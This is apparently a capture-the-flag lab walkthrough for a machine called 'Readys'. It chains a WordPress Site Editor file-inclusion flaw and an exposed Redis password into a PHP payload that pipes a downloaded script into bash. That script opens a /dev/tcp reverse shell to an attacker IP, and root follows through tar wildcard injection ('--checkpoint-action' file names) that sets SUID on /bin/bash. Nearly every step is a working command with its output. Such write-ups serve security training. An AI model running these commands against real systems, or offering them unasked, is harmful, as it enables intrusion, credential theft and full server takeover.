
# Exploitation Guide for Readys

## Summary

In this guide, we will use a WordPress plugin LFI vulnerability to gain access to a Redis service and then use the LFI and Redis access together to get a foothold on the system. We'll then abuse a cron backup script and wildcard injection to elevate to root access.

## Enumeration

### Nmap

We'll start by looking for open ports with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.85
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 14:17 EST
Nmap scan report for 192.168.120.85
Host is up (0.039s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
6379/tcp  open     redis

┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -p 22,80,6379 192.168.120.85
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-16 14:19 EST
Nmap scan report for 192.168.120.85
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.2
|_http-title: Readys &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.38 (Debian)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We find a webserver on port 80, SSH service on port 22, and a Redis server on 6379.

### WordPress Enumeration

The webserver appears to be a WordPress site. Let's run `wpscan` to learn more about it.

```
┌──(kali㉿kali)-[~]
└─$ wpscan --update --url http://192.168.120.85
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.120.85/ [192.168.120.85]
[+] Started: Tue Nov 16 13:21:24 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.120.85/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.120.85/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.120.85/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.120.85/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.120.85/index.php/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>
 |  - http://192.168.120.85/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.7.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://192.168.120.85/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://192.168.120.85/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 1.4
 | Style URL: http://192.168.120.85/wp-content/themes/twentytwentyone/style.css?ver=1.3
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.120.85/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] site-editor
 | Location: http://192.168.120.85/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.120.85/wp-content/plugins/site-editor/readme.txt

...
```

We find that there is one plugin enabled named "site-editor" that hasn't been updated since 2017. Let's check for exploits using `searchsploit`.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -u 
...
┌──(kali㉿kali)-[~]
└─$ searchsploit wordpress site editor 1.1.1
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                 | php/webapps/44340.txt
-------------------------------------------------------------------------- ---------------------------------
```

Success! Let's take a look at the text file associated with this LFI vulnerability.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 44340                                        
  Exploit: WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/44340
     Path: /usr/share/exploitdb/exploits/php/webapps/44340.txt
File Type: UTF-8 Unicode text

Copied to: /home/kali/44340.txt
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat 44340.txt 
Product: Site Editor Wordpress Plugin - https://wordpress.org/plugins/site-editor/
Vendor: Site Editor
Tested version: 1.1.1
CVE ID: CVE-2018-7422
...
** Proof of Concept **
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

** Solution **
No fix available yet.
...
```

## Exploitation

### Local File Inclusion Vulnerability

In the "Proof of Concept" section, we find the URI we can use to dump the contents of files on the target system. Let's test this by attempting to read **/etc/passwd**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
redis:x:107:114::/var/lib/redis:/usr/sbin/nologin
alice:x:1000:1000::/home/alice:/bin/bash
{"success":true,"data":{"output":[]}}
```

That was successful! From our port scan, we saw a Redis server running on the target. Let's use this LFI to dump the Redis config file. It's likely we will find it at **/etc/redis/redis.conf**. The config file is large, so let's output it to a file.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf -o redis.conf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 61899    0 61899    0     0   463k      0 --:--:-- --:--:-- --:--:--  464k
```

We'll search the file looking for words like "password". We come along a section that has an entry labeled "requirepass" with a value of `Ready4Redis?`.

```
...
################################## SECURITY ###################################

# Require clients to issue AUTH <PASSWORD> before processing any other
# commands.  This might be useful in environments in which you do not trust
# others with access to the host running redis-server.
#
# This should stay commented out for backward compatibility and because most
# people do not need auth (e.g. they run their own servers).
#
# Warning: since Redis is pretty fast an outside user can try up to
# 150k passwords per second against a good box. This means that you should
# use a very strong password otherwise it will be very easy to break.
#
requirepass Ready4Redis?
...
```

### Redis Enumeration

With this password, we can access the redis service. Let's install `redis-tools` and connect using `redis-cli` passing the password we just found.

```
┌──(kali㉿kali)-[~]
└─$ sudo apt install redis-tools
...
┌──(kali㉿kali)-[~]
└─$ redis-cli -h 192.168.120.85 -a Ready4Redis?
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
192.168.120.85:6379> ping
PONG
192.168.120.85:6379> 
```

We're connected. Maybe there is a way to gain a shell using redis. Searching the web, we find [this guide for Redis RCE](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce). The "Webshell" section may work for us, but we will have to know the path of the webroot.

Using the LFI vulnerability in WordPress, we can find the webroot by dumping **/etc/apache2/sites-enabled/000-default.conf**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
{"success":true,"data":{"output":[]}}
```

According to this file, the webroot is at **/var/www/html**. Let's try to create a webshell there using our redis access.

```
192.168.120.85:6379> config set dir /var/www/html
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('id'); ?>"
OK
192.168.120.85:6379> save
(error) ERR
192.168.120.85:6379> 
```

That didn't work. It appears that we don't have access to write to that directory. Perhaps the Redis service configuration will tell us where we can write to on the target system. Let's use the WordPress LFI to read **/etc/systemd/system/redis.service**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/systemd/system/redis.service          
...
ProtectSystem=true
ReadWriteDirectories=-/etc/redis
ReadWriteDirectories=-/opt/redis-files

[Install]
WantedBy=multi-user.target
Alias=redis.service
{"success":true,"data":{"output":[]}}
```

This file lists two folders as "READWRITEDIRECTORIES", **/etc/redis** and **/opt/redis-files**. Let's attempt to write a test file using Redis to the **/opt/redis-files** path.

```
192.168.120.85:6379> config set dir /opt/redis-files
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('id'); ?>"
OK
192.168.120.85:6379> save
OK
192.168.120.85:6379> 
```

We can then use the WordPress LFI to read this file. The contents will be in Redis RDB format so let's output it to a file and run `strings`.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php -o test.php
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   193  100   193    0     0   2014      0 --:--:-- --:--:-- --:--:--  2031
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ file test.php                  
test.php: Redis RDB file, version 0009
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ strings test.php      
REDIS0009
        redis-ver
5.0.14
redis-bits
ctime
used-mem
aof-preamble
test
uid=1000(alice) gid=1000(alice) groups=1000(alice)
 {"success":true,"data":{"output":[]}}
```

The output from the `id` command can be found in this file. This means we can execute a reverse shell using this method. Let's start by creating a file on our kali host named **shell.sh** with the following contents.

```bash
#!/bin/bash

/bin/bash -i >& /dev/tcp/192.168.118.14/9002 0>&1
```

Let's host this file using a python webserver to make it available to the target.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We then need to start a listener to catch the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9002
listening on [any] 9002 ...
```

Next, let's use our Redis session to cause the target to download and pipe **shell.sh** into `bash`.

```
192.168.120.85:6379> config set dir /opt/redis-files
OK
192.168.120.85:6379> config set dbfilename test.php
OK
192.168.120.85:6379> set test "<?php system('curl 192.168.118.14/shell.sh | bash'); ?>"
OK
```

Finally, we trigger our reverse shell by using the WordPress LFI.

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.120.85/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/test.php
...
```

This command will hang, and we will receive a connection to our listener.

```
connect to [192.168.118.14] from (UNKNOWN) [192.168.120.85] 45752
bash: cannot set terminal process group (551): Inappropriate ioctl for device
bash: no job control in this shell
<ite-editor/editor/extensions/pagebuilder/includes$ whoami
whoami
alice
<ite-editor/editor/extensions/pagebuilder/includes$ id
id
uid=1000(alice) gid=1000(alice) groups=1000(alice)
<ite-editor/editor/extensions/pagebuilder/includes$ 
```

We now have shell access as the user `alice`.

## Escalation

### Cron Job Enumeration

With our shell access, we'll search the box and find a cron job that executes a script named **backup.sh** as root every three minutes.

```
<ite-editor/editor/extensions/pagebuilder/includes$ cat /etc/crontab
cat /etc/crontab                         
*/3 * * * * root /usr/local/bin/backup.sh
```

Let's take a look at this script to see if it could be useful to us.

```
<ite-editor/editor/extensions/pagebuilder/includes$ cat /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh                         
#!/bin/bash

cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

This script checks for any files in the webroot that have been modified in the last three minutes. If any files are found, the webroot is backed up into a tar file using a wildcard "`*`".

We can check if alice has write access to the webroot using `ls` and it turns out that it is owned by alice.

```
<ite-editor/editor/extensions/pagebuilder/includes$ ls -l /var/www 
ls -l /var/www                         
total 4
drwxr-xr-x 5 alice alice 4096 Nov 17 10:21 html
```

### Wildcard Injection Vulnerability

With the cron backup script and our write access to the webroot, we can trick the `tar` command into running arbitrary commands as root using a wildcard injection. This works by using the `--checkpoint` and `--checkpoint-action` flags accepted by `tar`. If we create files in the webroot with names that are arguments for the `tar` command, they will be interpreted as arguments instead of filenames.

First, let's move into the webroot and create a file on the target named **exploit.sh** with a simple command to set SUID on **/bin/bash**.

```
<ite-editor/editor/extensions/pagebuilder/includes$ cd /var/www/html
cd /var/www/html
alice@readys:/var/www/html$ echo "chmod +s /bin/bash" > exploit.sh
echo "chmod +s /bin/bash" > exploit.sh
alice@readys:/var/www/html$ 
```

We then create two empty files using `touch`. The first will cause `tar` to cause a checkpoint on every file and the second will tell `tar` to execute our **exploit.sh** with `bash` on every checkpoint.

```
alice@readys:/var/www/html$ touch ./"--checkpoint=1"
touch ./"--checkpoint=1"
alice@readys:/var/www/html$ touch ./"--checkpoint-action=exec=bash exploit.sh"
touch ./"--checkpoint-action=exec=bash exploit.sh"
```

After a few minutes, we check if the cron job has run and if SUID is set on **/bin/bash**.

```
alice@readys:/var/www/html$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
alice@readys:/var/www/html$ 
```

We can now execute `bash` with SUID to gain a root shell on the target.

```
alice@readys:/var/www/html$ /bin/bash -p
/bin/bash -p
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
whoami
root
```
